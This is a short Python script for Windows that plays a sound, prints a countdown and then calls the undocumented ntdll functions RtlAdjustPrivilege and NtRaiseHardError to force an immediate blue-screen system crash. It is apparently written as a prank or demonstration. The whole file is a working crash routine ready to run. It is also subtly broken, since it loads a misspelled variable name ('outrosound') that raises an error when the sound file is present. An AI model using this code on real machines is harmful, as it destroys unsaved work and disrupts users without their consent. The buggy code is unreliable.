# Packages necessary to run
import time
import os
from pygame import mixer
from ctypes import windll, c_int, c_uint, c_ulong, POINTER, byref

def bsod():
    # Find and play sound (if in the same folder as this file)
    outroSound = os.path.join(os.getcwd(), 'outro.mp3')
    if os.path.exists(outroSound):
        mixer.init()
        mixer.music.load(outrosound)
        mixer.music.play()
    else:
        raise FileNotFoundError("Couldn't find outro.mp3.")

    time.sleep(0.1)
    for loopTime in range(10)[::-1]: #[::-1] <- Reverses the for loop countdown | A normal loop countdown would be "1, 2, 3, 4" but a reversed one would be "4, 3, 2, 1"
        if loopTime == 0:
            time.sleep(0.75)
            print("Shutting down now!")
            time.sleep(0.5)
        else:
            print(f"Shutting down in: {loopTime} Seconds.")
            time.sleep(0.75)

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )
    
if __name__ == "__main__":
    bsod()
